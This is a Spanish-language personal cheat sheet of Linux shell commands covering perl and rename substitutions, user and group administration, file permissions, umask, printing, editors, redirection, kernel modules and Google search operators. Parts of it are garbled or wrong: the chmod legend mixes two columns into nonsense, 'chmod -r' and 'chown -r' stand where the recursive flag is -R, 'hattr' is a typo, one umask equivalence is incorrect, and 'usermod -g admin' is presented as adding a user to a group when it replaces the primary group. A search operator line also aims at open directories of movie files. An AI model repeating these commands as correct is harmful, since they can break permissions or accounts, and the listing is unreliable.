#### una vez creado el hash md5 y almacenado en un archivo, podemos comprobar el hash md5 del archivo coincide con el del archivo descargado de la siguiente manera: ####

md5sum -c cd_boot.iso.md5

#### si al ejecutar este comando, obtenemos un mensaje como el siguiente, sabemos que hemos descargado el archivo perfectamente: ####

cd_boot.iso: la suma coincide



#############################################################################################################################################################################################

############################################################################################# perl ##########################################################################################

#### perl

#### a veces queremos sustituir una cadena en todos los los archivos de un directorio y sus subdirectorios de forma recursiva. Esto es sencillo de hacer utilizando perl. vamos a verlo por partes: ####

#### cuando queremos sustituir directamente una cadena por otra en un archivo, hacemos algo asi: ####

perl -p -i -e 's/cadenaasustituir/nuevacadena/g' archivo

#### si la sustitucion queremos hacerla en todos los archivos de un subdirectorio, haremos: ####

perl -p -i -e 's/cadenaasustituir/nuevacadena/g' *

#### si queremos sustituir la cadena en todos los subdirectorios del directorio actual, combinaremos el comando perl con un comando find que busque todos los archivos: ####

perl -p -i -e 's/cadenaasustituir/nuevacadena/g' `find ./ -name *`

#### y ya para terminar de rematar: si queremos sustituir una cadena por otra en todos los archivos con un determinado nombre en todos los subdirectorios del directorio actual: ####

perl -p -i -e 's/cadenaasustituir/nuevacadena/g' `find ./ -name "patronabuscar"`

#### veamos unos ejemplos: ####

#### sustituir la cadena jose por pepe en el archivo clientes.txt: ####

perl -p -i -e 's/jose/pepe/g' clientes.txt

#### sustituir la cadena jose por pepe en todos los archivos del directorio actual: ####

perl -p -i -e 's/jose/pepe/g' *

#### sustituir la cadena jose por pepe en el directorio actual y en todos sus subdirectorios: ####

perl -p -i -e 's/jose/pepe/g' `find ./ -name *`

#### sustituir la cadena jose por pepe en todos los archivos con extension .txt del directorio actual y de todos sus subdirectorios: ####

perl -p -i -e 's/jose/pepe/g' `find ./ -name "*.txt"`

#### y un ultimo ejemplo: sustituir la cadena $(grub_device) por la cadena (hd0,1) en todos los archivos con extension .lst del directorio actual y sus subdirectorios: ####

perl -p -i -e 's/\$\(grub_device\)/\(hd0,1\)/g' `find ./ -name "*.lst"`

#### convertir archivo de texto codificion mac a unix ####

perl -p -e 's/\r/\n/g'  < macfile.txt > unixfile.txt

#### convertir archivo de texto codificacion unix a mac ####

perl -p -e 's/\n/\r/g' < unixfile.txt > macfile.txt

#############################################################################################################################################################################################

############################################################################################ rename #########################################################################################

#### rename

#### renombrar mayusculas a minusculas ####

rename 'y/A-Z/a-z/' *

#### renombramos el espacio en blanco por _ (en este caso en el nombre de los .jpg) ####

rename 'y/ /_/' *.jpg

#### eliminamos una expresion en el nombre de todos los .mp3 del directorio actual. ####

rename 's/expresion //' *.mp3

#### quitar \"m.oldfield\" del nombre en todos los mp3 ####

rename 's/m.oldfield//' *.mp3

#### cuando se trabaja fundamentalmente en terminales de linea de comandos nos viene muy bien conocer herramientas como rename. ####

#### rename es un comando que nos permite renombrar archivos de forma masiva desde la shell de linux, es decir, que no tenemos mas que ejecutar un comando para renombrar una lista de archivos con un patron comun. la sintaxis del comando rename es muy sencilla: ####

rename perlexpr [ archivos ]

#### donde: perlexpr es una expresion regular en lenguaje perl. y [archivos] es la lista de archivos a los que afectara el comando. ####

#### quizas lo mas complicado sea hacer las expresiones regulares. #####

#### veamos un ejemplo sencillo: imaginemos que queremos cambiar la extension de los archivos .txt del directorio actual por .csv . no tendremos mas que ejecutar el comando rename de la siguiente manera: ####

rename 's/\.txt/\.csv/' *.txt

's/\.txt/\.csv/'   -   es la expresion regular que dice "cambia .txt por .csv".
* .txt   -   es la lista de archivos a los que hay que aplicarles el cambio.

#### otro ejemplo: supongamos que queremos convertir a minusculas todos los caracteres del conjunto de archivos contenidos en el directorio actual: ####

rename 'y/A-Z/a-z/' *

'y/a-z/a-z/'   -   es la expresion regular que dice "cambia los caracteres mayusculas por minusculas".
*   - le dice al comando que lo haga en todos los archivos.

#### otro ejemplo: imaginemos que queremos eliminar la extension de todos los archivos que tengan extension .bak en el directorio actual: ####

rename 's/\.bak$//' *.bak

* 's/\.bak$//'   -   le dice al comando que renombre los archivos terminados en .bak por el nombre del archivo sin
.bak   -   es decir, que elimine el .bak. 

*.bak   -   le dice al comando que actue solo en los archivos con extension .bak del directorio actual.

#### en estos ejemplos hemos trabajado solo en el directorio actual, pero se puede especificar un directorio cualquiera. por ejemplo: ####

rename 's/gestor/profesor/' /home/profesor/archivos/*

#### una cuestion importante: si estoy trabajando en un script bash y quiero utilizar una variable del script en la expresion regular de perl, tengo que exportarla para convertirla en una variable de entorno: ####

export usuario

#### una vez exportada, ya puedo usarla en la expresion regular haciendo referencia a ella de la siguiente manera: $env{'usuario'} viendolo en el ejemplo: ####

rename 's/gestor/$env{'usuario'}/' /home/profesor/$usuario/.nautilus/metafiles/*

#### renombrar multiples archivos en un comando ####

rename 's/.xls/.ods/g' *.xls

rename 's/tigerinh0/tiger/g' *.urtdemo

#############################################################################################################################################################################################

#################################################################### adduser addgroup userdel groupdel groupmod usermod deluser #############################################################

#### adduser #### addgroup #### userdel #### groupdel #### groupmod #### usermod #### deluser

#### no trabajo habitualmente con usuarios locales porque en los centros tenemos centralizados los usuarios en un servidor de ldap, pero en ocasiones hay que crear algun usuario local. estos son algunos de los comandos que suelo usar para trabajar con usuarios y grupos: ####

#### anadir usuarios. cuando necesito anadir nuevos usuarios locales, normalmente utilizo adduser, que, ademas de crear el usuario, crea tambien su home. si queremos crear un usuario, pero no necesitamos crear un directorio home para el, podemos emplear useradd en lugar de adduser. podemos ajustar algunas preferencias a la hora de crear usuarios en el archivo: /etc/adduser.conf. ####

#### ejemplo: para crear a un nuevo usuario ####

adduser usuario

#### y el sistema nos preguntara los datos del usuario, ademas de una password de acceso. por defecto, se creara un grupo con el nombre del usuario y este sera el grupo por defecto. este comportamiento puede modificarse en /etc/adduser.conf. ####

#### ejemplo: si queremos anadir un nuevo usuario, llamado enavas al sistema, estableciendo users como su grupo principal, podemos hacerlo de la siguiente manera: ####

adduser --ingroup users enavas

#### ahora bien, si lo que queremos es anadir un usuario ya existente a un grupo ya existente, podemos hacerlo de la siguiente manera: ####

adduser usuario grupo

#### ejemplo: supongamos que queremos anadir el usuario enavas al grupo plugdev: ####

adduser enavas plugdev

#### crea un usuario pero sin directorio personal (home) ####

adduser --no-create-home usuario

#### crear un usuario en el sistema pero que no se pueda logear, util para crear un usuario que tendra permisos en una base de datos para administrar un servidor pero que no necesita login ####

adduser --disabled-login usuario
 
#### anadir grupos: para anadir grupos locales al sistema, podemos emplear el comando addgroup. tambien podemos ajustar algunas preferencias a la hora de crear usuarios en el archivo: /etc/adduser.conf. ####

#### podemos anadir un nuevo grupo local al sistema con el comando addgroup. ####

addgroup grupo

#### ejemplo: si queremos anadir el grupo profesores al sistema, ejecutaremos: ####

addgroup profesores

#### una ultima cosa: de forma alternativa, en lugar de usar los comandos adduser y addgroup, podemos anadir usuarios y grupos empleando otros comandos como useradd y groupadd. estos comandos leen informacion de configuracion del archivo /etc/login.defs. ####

#### eliminar usuarios. para eliminar usuarios podemos usar el comando userdel. ####

#### ejemplo: si queremos eliminar el usuario local dfernandez, ejecutaremos el siguiente comando: ####

userdel dfernandez

#### si, ademas, empleamos el parametro -r, tambien se borrara el directorio personal del usuario con todo su contenido. ejemplo: ####

userdel -r dfernandez 

#### eliminar grupos. para eliminar grupos podemos emplear el comando groupdel. ####

#### ejemplo: si queremos eliminar el grupo alumnos del sistema local, ejecutaremos: ####

# groupdel alumnos

#### modificar usuarios y grupos para modificar las caracteristicas de los usuarios y grupos se emplean los comandos usermod y groupmod. ####

#### ejemplo: imaginemos que queremos cambiar el directorio home del usuario dgonzalezs01 para que sea /home/alumnos/dgonzalezs01. ####

# usermod -d /home/alumnos/dgonzalezs01 -m

#### la opcion -m hace que mueva el contenido del antiguo home al nuevo emplazamiento. ####

#### si lo que queremos es cambiar el grupo inicial al que pertenece el usuario, haremos lo siguiente: ####

usermod -g grupo usuario

#### ejemplo: cambia el grupo inicial del usuario jmartinezd01 para que sea profesor. #####

usermod -g profesor jmartinezd01

#### si queremos cambiar el login nombre del usuario: ####

usermod -l nuevonombre nombreactual

#### para cambiar el login nombre de usuario por ejemplo para modificar el login nombre de usuario carlosfernandez a cfernandez. ####

usermod -m -d home_dir -l cfernandez carlosfernandez    - al cambiar el login nombre de un usuario se aconseja usar el parametro "-d" y "-m" para transferir el contenido de su home a su nuevo home

#### fecha en que la cuenta del usuario sera desactivada, expresada en formato aaaa-mm-dd ####

usermod -e 2006-04-14 usuario

#### y si queremos cambiar el nombre de un grupo, lo haremos de la siguiente manera: ####

groupmod -n nuevonombregrupo nombreactualgrupo

#### ejemplo: ####

groupmod -n profesores profes

#### cambia el nombre del grupo profes a profesores. ####

#### algunos archivos relacionados con las cuentas de usuario son: ####

/etc/passwd: contiene informacion sobre cada usuario:

id.
grupo principal.
descripcion.
directorio de inicio.
shell, etc.
tambien contiene el password encriptado, salvo que se usen shadow passwords.

/etc/shadow: contiene los passwords encriptados de los usuarios, cuando se emplean shadow passwords.

/etc/group: contiene los miembros de cada grupo, excepto para el grupo principal, que aparece en el archivo /etc/passwd.

/etc/skel: directorio que contiene el contenido del directorio de los nuevos usuarios.


#### agregar usuarios a grupos ####

gpasswd -a <user> <grupo>

adduser user group

#### ejemplo agregar un usuario normal al archivo sudoers para que tenga permisos de superusuario y pueda usar "sudo" ####

adduser $USER admin

#### agregar un usuario al grupo admin (wheel en otras distros como arch) para que pueda ejecutar tareas administrativas al escribir su password con sudo:   usermod -a -g groupname username ####

usermod -g admin usuario

#### agregar un usuario al grupo admin (wheel en otras distros como arch) para que pueda ejecutar tareas administrativas al escribir su password con sudo:   useradd -g groupname username ####

useradd -g admin usuario

#### elimina un usuario ####

deluser usuario

#### elimina un usuario del grupo especificado ####

deluser usuario grupo

#### elimina un usuario y su directorio home ####

deluser --remove-home usuario

#### elimina un grupo ####

delgroup grupo

#### elimina un grupo solo si no tiene ningun usuario ####

delgroup grupo --only-if-empty




#############################################################################################################################################################################################

############################################################################################# chmod #########################################################################################

#### chmod

#### chmod cambia los permisos de acceso de un archivo o directorio ####

+: da permisos
-: quita permisos
u: propietario
r: recursivo
g: grupo
r: lectura ejemplo: chmod +x archivo, es lo mismo que: chmod a+x archivo
o: otros
w: escritura explicacion: a es la opcion por defecto.
a: todos 
x: ejecucion
s: los atributos suid y sgid, otorgan a un \"archivo\" los permisos de su dueno o grupo respectivamente, cada vez que se ejecute, sea quien sea el que lo ejecute. # no funciona con scripts #

#### ejemplo: chmod +s /usr/bin/cdrecord ####

#### como afectan los permisos a los directorios: ####

r permite ver su contenido(no el de sus archivos)
w permite anadir o eliminar archivos (no modificarlos)
x permite acceder al directorio.

#### metodo absoluto de determinar los permisos: chmod 760 archivo ####

explicacion:          dueno     grupo      otros
------------          -----     -----      -----
asci                  r w x     r w -      - - -
binario               1 1 1     1 1 0      0 0 0
octal                   7         6          0
paso de asci          r w x     r w -      - - -   activar=1
a binario             1 1 1     1 1 0      0 0 0   desactivar=0
a octal                 7         6          0     x activado=1



#### para dar todos los permisos a un usuario y grupos sobre un archivo utilizando chmod se usa ####

chmod ug+rwx archivo/carpeta

#### para remover todos los permisos a grupos sobre un archivo o carpeta utilizando chamod hacemos ####

chmod g-rwx archivo/carpeta

#### para plicar los cambios de los permisos en todos los archivos y subdirectorios dentro de un directorio utilizando chmod hacemos ####

chmod -r u+rwx directorio/

#### chmod sin chmod ####

/lib/ld-linux.so.2 /bin/chmod u+x script.sh   - 32 bits 

/lib64/ld-linux-x86-64.so.2 /bin/chmod u+x /bin/ls   - 64 bits


#### colocar el bit suid en un archivo binario. el usuario que corriendo ese archivo adquiere los mismos privilegios como dueno ####

chmod u+s /bin/binario

#### deshabilitar el bit suid en un archivo binario ####

chmod u-s /bin/binario

#### colocar un bit sgid en un directorio similar al suid pero por directorio. ####

chmod g+s directorio/

#### desabilitar un bit sgid en un directorio ####

chmod g-s directorio/

#### colocar un bit stiky en un directorio. permite el borrado de archivos solamente a los duenos legitimos ####

chmod o+t directorio/

#### desabilitar un bit stiky en un directorio ####

chmod o-t directorio/



#############################################################################################################################################################################################

############################################################################################ chown ##########################################################################################

#### chown

#### para cambiar los permisos del propietario de un archivo o carpeta utilizamos chown por ejemplo ####

chown usuario:grupo archivo/carpeta

#### para plicar los cambios de los permisos de propietario en todos los archivos y subdirectorios dentro de un directorio utilizando chmod hacemos ####

chown -r usuario:grupo carpeta/



#############################################################################################################################################################################################

########################################################################################### chattr ##########################################################################################

#### chattr

#### permite escribir abriendo un archivo solamente modo append ####

hattr +a archivo

#### permite que un archivo sea comprimido / descomprimido automaticamente ####

chattr +c archivo

#### asegura que el programa ignore borrar los archivos durante la copia de seguridad ####

chattr +d archivo

#### convierte el archivo en invariable, por lo que no puede ser eliminado, alterado, renombrado, ni enlazado ####

chattr +i archivo

#### permite que un archivo sea borrado de forma segura ####

chattr +s archivo

#### asegura que un archivo sea modificado, los cambios son escritos en modo synchronous como con sync ####

chattr +S archivo

#### te permite recuperar el contenido de un archivo aun si este esta cancelado ####

chattr +u archivo

#### mostrar atributos especiales ####

lsattr



#############################################################################################################################################################################################

########################################################################################### umask ###########################################################################################

#### umask

umask 0 2 2 = chmod 7 5 5
umask 0 0 0 = chmod 7 7 7
umask --- -w- -w- = chmod rwx r-x r-x
umask --- --- --- = chmod rwx r-x r-x

#### una manera rapida de averiguar los permisos partiendo de umask es aplicando la siguiente resta: ####

777 - 022= 755 para el primer caso y 777 - 000= 777 para el segundo.

#### cuando umask es 022,los permisos normales de un directorio son 755 (rwx r-x r-x) producto de la resta 777 - 022. sin embargo los de un archivo son 644 (rw- r-- r--). Esto es asi porque se considera que lo normal para un archivo es que no sea ejecutable de manera que la resta para averiguar los permisos de un archivo seria 666 - 022= 644 ####

#### si escribo en una consola umask 000 y a continuacion "mkdir nuevodirectorio", este tendra todos los pemisos: rwx rwx rwx (777) pero ?y los archivos que creemos dentro de dicho directorio? pues estos tendran los permisos : rw- rw- rw- (666) resultado de la resta 666 - 000= 666 ####

#### con umask podemos establecer habilitar o deshabilitar los permisos que tendran los archivos nuevos que creamos ####

#### para que la mascara de permisos permanezca de una sesion a otra tienes que ponerla en el .bash_profile o en .bashrc de tu home ####

#### para ver la configuracion actual de umask ####

umask

#### para darle 777 (rwx-rwx-rwx) a todos los archivos nuevos que creamos ####

umask 000




#############################################################################################################################################################################################

############################################################################################# lpr ###########################################################################################

#### lpr

#### anade un documento a la cola de impresion ####

lpr archivo

#### se especifica la impresora a la que queremos mandar el archivo a imprimir ####

lpr -p "nombre_impresora" archivo

#### realiza 3 copias del archivo. ####

lpr -#3 archivo

#### imprime solo las paginas impares del archivo que hemos mandado a la impresora "hp" ####

lpr -p "hp" -o page-set=odd archivo

#### imprime el intervalo de paginas 7-49 del documento ####

lpr -o page-ranges=7-49 archivo

#### muestra los documentos en cola. ####

lpq

#### cancela la impresion del documento activo. ####

lprm

#### cancela la impresion del trabajo n? 3. ####

lprm 3

#### preprocesador de impresion para formatear un archivo de texto. ####

pr +2 l70 -w 80 -h \"comandos\" archivo   -  -l70  establece la longitud de la pagina de 70 lineas (66 por defecto).   -w 80   establece el ancho de linea en 80 caracteres()72 por defecto).  -h \"comandos\"  establece \"comandos\" como cabecera de cada pagina.   +2  imprime a partir de la pagina 2.   -t  no imprimiria cabeceras ni pies de pagina.  ####

#### una vez formateado el documento lo manda a la cola. ####

pr l70 -d comandos.txt | lpr



#############################################################################################################################################################################################

############################################################################################# nano ##########################################################################################

#### nano

#### sintaxis basica

nano archivo

#### con nano podemos leer, crear, editar un archivo de texto ####

m = esc/alt | | ctrl + g ----------- invocar el menu de ayuda.
ctrl + x ----------- salir de nano.
ctrl + o ----------- escribir el archivo actual a disco.
ctrl + r ----------- insertar otro archivo en el actual.
ctrl + w ----------- buscar un texto en el editor.
ctrl + y ----------- moverse a la pagina anterior.
ctrl + v ----------- moverse a la pagina siguiente.
ctrl + k ----------- cortar la linea actual y guardarla en el cutbuffer.
ctrl + u ----------- pegar el cutbuffer en la linea actual.
ctrl + l ----------- redibujar la pantalla actual.
ctrl + j ----------- justificar el parrafo actual.
ctrl + m ----------- insertar un retorno de carro en la posicion del cursor.
ctrl + _ ----------- ir a un numero de linea en concreto.
m + g -------------- ir a un numero de linea en concreto.
m + i -------------- auto indentar habilitar/deshabilitar.
m + x -------------- modo ayuda habilitar/deshabilitar.
m + p -------------- modo pico habilitar/deshabilitar.
m + m -------------- soporte para raton habilitar/deshabilitar.
m + r -------------- reemplazar texto en el editor.
m + e -------------- expresiones regulares habilitar/deshabilitar.
m + b -------------- respaldar archivos habilitar/deshabilitar.
m + s -------------- desplazamiento suave habilitar/deshabilitar.
m + h -------------- tecla \'smart home\' habilitar/deshabilitar.
m + y -------------- coloreado de sintaxis habilitar/deshabilitar.
m + p -------------- mostrar blancos habilitar/deshabilitar.


#### para ir a una linea especifa al abrir un archivo de texto ####

nano +linea archivo.txt

############################################################################################ vim ############################################################################################

#### vim

#### nvim

You can open vim in split-screen mode, with the -O option:-

vim -O file1 [file2 ...]

To then turn on diff mode, you need to run the :diffthis command in each pane.

Another use-case scenario, is if you've already got one file open in vim, and you want to open and compare it 
against another. Then you can use the following vim commands:-

:vs otherfile (open otherfile in vertical split screen)
:diffthis (turn on diff mode in original file)
Ctrl+w l  (swap to newly opened file)
:diffthis (turn on diff mode in opened file)

You can then turn off diff mode in each pane with the vim command :diffoff.

EDIT
And the other standard one that hasn't been mentioned:-

vim -d file1 [file2 ...]

This is equivalent to calling vimdiff directly.



#############################################################################################################################################################################################

############################################################################################ tidy ###########################################################################################

#### tidy

#### tidy se guia por el estandar de la w3c y nos puede servir para analizar verificar la sintaxis de un archivo html para corregirlo o para reformatearlo ####

#### visualizar archivos html ####

[w3m,lynx,links,links2,elinks] archivo.html

#### analiza el codigo de un documento html. ####

tidy archivo.html

#### corrige, modificandolo, el codigo del archivo html. ####

tidy -m archivo.html

#### convierte un html a xml. ####

tidy -m -asxml archivo.html

#### convierte un html a xhtml. ####

tidy -m -asxhtml archivo.html

#### convierte un xhtml a html. ####

tidy -m -ashtml archivo.xhtml



#############################################################################################################################################################################################

################################################################### conceptos entrada salida pipes redireccionamiento i/o e/s ###############################################################

#### stdin #### stdout #### stderr

stdin = entrada estandar para datos, el teclado (0)

stdout = salida estandar para los programas, la pantalla (1)

stderr = salida estandar para los mensajes de error, la pantalla (2)


#### redirecciones, un redireccionador redirige la salida de un comando a un archivo ####

(<)   comando < archivo

(>)   su sintaxix suele ser: comando > archivo

(>>)  comando >> archivo


#### ejemplos: ####


dpkg --get-selections > programas_instalados.txt

#### en vez de mostrar la salida por pantalla, nos la vuelca al archivo programas_instalados.txt si ese archivo ya existia ha sido sobreescrito su contenido, pero si usamos >> no borrara nada y anadira su salida al final del archivo. otro ejemplo con echo: ####


echo \"fin de la lista de programas instalados\" >> programas_instalados.txt

#### en vez de mostrar en pantalla el texto,lo anade al final del archivo programas_instalados.txt ####


#### para despistar los de unix se han inventado el mismo caracter pero al reves: ####

cat < programas_instalados.txt

#### en donde programas_instalados no de salida sino de entrada para cat el cual lo muestra en pantalla, ya que la salida natural de cat es la estandar, stdout o pantalla ####


#### si queremos que la salida de error no aparezca en pantalla sino que vaya a un archivo de texto: ####

comando 2> archivo.txt ejemplo: xmms 2> error_xmms.txt


#### tuberias, una tuberia hace que la salida de un programa sea la entrada de otro. ####

#### (|) su sintaxis suele ser: ####

comando | comando


#### ejemplos: ####

cat programas_instalados.txt | grep mozilla

#### aqui le hemos cambiado la salida natural a cat y se la hemos mandado a grep para que busque la palabra mozilla dentro del archivo programas_instalados.txt ####


pr l70 -d comandos.txt | lpr 

#### una vez formateado el documento (pr) lo manda a la cola (lpr) ####


#############################################################################################################################################################################################

############################################################################################ mtools #########################################################################################

#### mtools

#### coleccion de herramientas que permite acceder y manipular archivos de ms-dos sin necesidad de un montaje previo. el uso de comodines refiriendose a archivos del disquete requiere que los nombres se entrecomillen para que no sean interpretados por el shell sino por herramientas de mtools. mas informacion:\"info mtools\" ####


minfo unidad:   - muestra informacion sobre el sistema de archivos ms-dos de una unidad (a:)

mformat a:   - formatea un disquete,donde \"a:\" es \"dev/fd0\"

mbadblocks a:   - se emplea tras formatear para buscar errores.

mcd [a:]   - informa del directorio ms-dos en curso o bien cambiamos a uno.

mdir -a a:   - muestra el contenido de un directorio ms-dos.

mcopy   - copia de archivos ms-dos a/o desde unix.

mcopy \"a:directorio/*\"   - copiaria el contenido de \"a:directorio/*\" al directorio en curso.

mcopy \"a:directorio/*\" ~/disquete   - copiaria el contenido de \"a:directorio/*\" al directorio \"disquete\".

mcopy *.txt a:bill   - copiaria al directorio \"bill\" del disquete todos los .txt.

mmd a:nuevo_directorio   - crea un directorio ms-dos

mdel \"a:bill/*.txt\"   - elimina un archivo ms-dos.

mrd a:bill   - elimina un directorio ms-dos

mdeltree a:bill   - elimina recursivamente un directorio ms-dos

mren \"a:direct1/*.txt\" a:direct2   - mueve o renombra archivos ms-dos

mmove a:directorio1 a:directorio2   - mueve o renombra archivos o subdirectorios ms-dos

#### comandos relacionados: ####

mkfs.msdos /dev/fd0   - formatea en formato msdos un disquete.

fdformat /dev/fd0   - formatea en formato msdos un disquete y despues verifica el formateo.



#############################################################################################################################################################################################

##################################################################################### gestion de procesos ###################################################################################

#### nohup #### & #### jobs #### fg #### bg #### nice #### renice

#### lanza un proceso de forma que si cerramos el shell, el proceso continua ejecutandose ####

nohup comando &

#### ejecuta un comando en segundo plano(background),permitiendonos seguir usando el promp ####

comando &

#### lista los procesos en segundo plano identificandolos con un n? de tarea ####

jobs

#### pasa a primer plano (foreground)un proceso ####

fg n?

#### pasa a background un proceso que hemos suspendido temporalmente tecleando ctrl-z ####

bg

#### ejecuta un comando con una prioridad determinada (0 por defecto) ####

nice -n prioridad comando

#### cambia la prioridad de un proceso en marcha ####

renice prioridad pid_del_proceso



#############################################################################################################################################################################################

########################################################################################## modules ##########################################################################################

#### modules #### lsmod #### rmmod #### insmod #### modprobe #### modinfo

#### listar los modulos cargados en el kernel ####

lsmod

#### ver si esta cargado el modulo ####

lsmod | grep modulo

#### muestra informacion sobre un modulo ####

modinfo modulo

#### inserta un modulo en el kernel cargando antes los modulos de los cuales dependa ####

modprobe modulo

#### elimina un modulo del kernel y si procede los que dependen del mismo ####

modprobe -r modulo

#### inserta un modulo en el kernel ####

insmod modulo

#### elimina un modulo del kernel ####

rmmod modulo

#### inserta un modulo en el kernel de forma permanente en cada inicio del sistema ####

echo modulo >> /etc/modules

#### comprueba las dependencias del modulo ####

depmod modulo

#### programa grafico para listar,cargar y descargar modulos del kernel ####

modconf

#### solucion congela puntero mouse ####

rmmod psmouse && sudo modprobe psmouse


#############################################################################################################################################################################################

############################################################################################## bc ###########################################################################################

#### bc #### calculadora

#### abrimos bc ####

bc

#### suma ####

> 20 + 5.4

#### resta ####

> 77 - n?

#### multiplica ####

> 99 * 86

#### muestra el cociente de la division ####

> 47 / 3

#### muestra el resto de la division ####

> 47 % 3

#### calcula la potencia 4? ####

>4 ^ 2

#### calcula la raiz cuadrada de 16 ####

> sqrt (16)

#### un poco de cada ####

> (2*3+2) / sqrt (2^3/2.5)

#### salimos de bc ####

> quit



#### nota ####

#### tambien podemos hacerlo usando echo y mandando la salida a bc: (en este caso los parentesis deben ir entrecomillados) ####

echo \"(2*3+2)\" / sqrt \"(2^3/2.5)\" | bc

#############################################################################################################################################################################################

############################################################################################ hexdump ########################################################################################

#### hexdump

#### hexdump se usa para mirar dentro de los archivos binarios. hexdump puede mostrar el contenido en muchas maneras diferentes ####

#### ejemplo ####

hexdump -c /bin/bash

#### cada caracter decimal representa 4 bits. cada par representa un byte. ####

#### las columnas son segun se muestra a continuacion: ####

1. una direccion de 32 bits. (8 hex, *4 bits / hex, = 32 bits)
2. 8 bytes en esa direccion, de izquierda a derecha
3. 8 bytes mas
4. los mismos 16 bytes, interpretados como una cadena texto claro


#############################################################################################################################################################################################

############################################################################################# tty ###########################################################################################

#### tty

#### en las tty o terminales de modo texto que tenemos en nuestro gnu/linux, podemos hacer infinidades de cosas pero sin  conocer las combinaciones de teclas para movilizarnos por ellas, se nos complica bastante algunas acciones tan  normales en el mundo grafico como cortar y pegar. espero que les resulte util el articulo, es una recopilacion de  combinaciones muy utilizadas. para utilizar alguna consola tty solo es necesario presionar [ctrl]+[alt]+[x]. donde x representa la tecla f1 hasta  f6 inclusive ####


#### desplazamiento: ####

[alt] + [f1 hasta f9] -> en modo texto cambia la tty 1,2 ... permite tener varias sesiones abiertas aunque no se tengan ventanas. [alt] + f7 permite volver al modo grafico.

[flecha arriba] / [flecha abajo] -> desplazarse a traves del historial de comandos de consola.

[alt] + [flecha izquierda] / [flecha derecha] -> desplazarse entre las diferentes consolas abiertas.

[shift] + [repag]/[avpag] -> hace scroll vertical por el terminal. como si tuviera barra de desplazamiento vertical.


#### movimiento del cursor: ####

[ctrl] + a -> mueve el cursor al principio de la linea

[ctrl] + e -> mueve el cursor al final de la linea.

[ctrl] + f -> mueve el cursor una letra adelante.

[ctrl] + b -> mueve el cursor una letra hacia atras.

[alt] + f -> mueve el cursor al final de la palabra.

[alt] + b -> mueve el cursor al comienzo de una palabra. opuesto al anterior.


#### borrar: ####

[ctrl] + d -> para borrar el caracter seleccionado con el cursor. similar a la tecla supr.

[ctrl] + w -> borra la palabra anterior o, si el cursor esta sobre una palabra, borra su primera letra.

[ctrl] + l -> limpia toda la pantalla, salvo la ultima linea (equivalente a clear).


#### seleccion: ####

aun desconozco si se pueda seleccionar texto con el teclado, por el momento solo conozco con el uso del mouse, mediante el daemon gpm. o a traves del window manager para las terminales, screen.


#### cortar: ####

[ctrl] + u -> corta desde el comienzo de la linea hasta el cursor.

[ctrl] + k -> lo mismo, pero desde el final hasta el punto en el que estoy (se supone que el cursor lo tengo en algun punto entre el principio y el final de la linea).

[alt] + d -> si el cursor esta al principio de la palabra, corta la palabra, si el cursor esta encima de una letra, corta las siguientes letras hasta que encuentre un espacio.


#### pegar: ####

[ctrl] + y -> pega la ultima linea almacenada en el buffer.

[alt] + y -> busca en el buffer las lineas almacenadas que deseamos pegar.

[shift] + insert -> pega lo que hemos seleccionado.


#### auto completar: ####

2t significa presionar dos veces consecutivas la tecla tab:

2t -> muestra todos los comandos disponibles.

(abc)2t -> muestra todos los comandos disponibles empezando con (abc).

*2t -> muestra los directorios del directorio donde estemos ubicados.

./2t -> muestra todos los directorios del directorio donde estemos ubicados, incluyendo los ocultos.

/2t -> muestra los directorios del archivo raiz.

~2t -> muestra todos los usuarios que posean directorio ubicados en /etc/passwd.

$2t -> muestra todas las variables del sistema.

@2t -> muestra las entradas en /etc/hosts


#### ademas: ####

[alt] + c -> si el cursor esta sobre una letra, la convierte en mayuscula y mueve el cursor al final.

[ctrl] + r -> busca comandos y/o palabras que escribimos en la terminal. las cuales se almacenan en .bash_history.

[ctrl] + s -> activa el scroll lock. es decir no vemos lo que escribimos o los comandos que ejecutamos en la terminal.

[ctrl] + q -> desactiva el scroll lock y volvemos a tener uso del teclado.

[ctrl] + z -> deja en suspenso un proceso, pudiendo posteriormente ejecutarlo en background (pulsando "bg") o en "foreground" (pulsando "fg").

[ctrl] + c -> quita la linea que estabas escribiendo (si se pulsa mientras se ejecuta algun programa en esa shell, esta aplicacion es matada).

[ctrl]+ d -> termina la terminal actual.

[ctrl]+[alt]+[del] -> shutdown. apaga el sistema de forma organizada desde una terminal texto


#############################################################################################################################################################################################

########################################################################################## google ###########################################################################################

#### terminos de busqueda

allinanchor: seguido de varias palabras, te da resultados de paginas en la que estan todas las palabras en el enlace.

allintext: seguido de varias palabras, te da resultados de paginas en la que estan todas las palabras en la pagina.

allintitle: seguido de varias palabras, te da resultados de paginas en la que estan todas las palabras en el titulo.

allinurl: seguido de varias palabras, te da resultados de la busqueda de todas esas palabras en la url.

author: (solo funciona en google groups) busca en los grupos articulos escritos por el nombre o la direccion de correo que le pasemos.

bphonebook: si le pasas un lugar o direccion, te da el numero de telefono.

cache: seguido de una url, te mostrara la pagina en cache.

datarange:

define: seguido de una palabra, te da la definicion.

ext: ver filetype.

filetype: seguido de una exteniso determinada, busca documentos en ese tipo de archivo.

group: (solo funciona en google groups) te restringe la busqueda con el grupo que le pases.

groups: ver group.

id: ver info.

inanchor: solo la primera palabra de las que le siguen, ha de estar en el enlace.

info: seguido de una url, mostrara una pagina con enlaces relacionados, paginas que contiene esa url...

insubject: (solo funciona en google groups) busca en el asunto del mensaje.

intext: solo la primera palabra de las que le siguen, te da resultados de paginas en la que este la palabra en la pagina.

intitle: solo la primera palabra de las que le siguen, ha de estar en el titulo.

inurl: solo la primera de las palabras que le siguen, ha de estar en la url.

link: seguido de una url, te encuentra todas aquellas paginas que enlazan con la url dada.

location: (solo funciona en google news) si le pasas un pais a la busqueda, te restringe los resultados a ese pais.

msgid: (solo funciona en google groups) busca el mensaje con ese id.

phonebook: te dara resultados de telefonos con las palabras que le siguen.

RELATED: seguido de una url, tiene el mismo efecto qe cuando se pulsa sobre el enlace de "enlaces relacionados".

rphonebook: te dara resultados de telefonos residenciales con las palabras que le siguen.

site: seguido de un dominio, te da los resultados de la busqueda solo en ese dominio.

source: (solo funciona en google news) te limita las busquedas al medio de comunicacion que le indiques.

spell:

stocks: seguido de un codigo de bolsa, te dara los datos concretos.

store: (solo funciona en froogle) te limita las busquedas a un determinado comercio.

intitle:index.of? mkv Movie Name

#############################################################################################################################################################################################

#### google bot

#### Googlebot's recent improvements might revolutionize web development May 27, 2014 ####

Googlebot is apparently much better at parsing JavaScript than many of us were aware - to the point where single page apps without a server-side HTML alternative now seem to be possible, even when SEO is important.

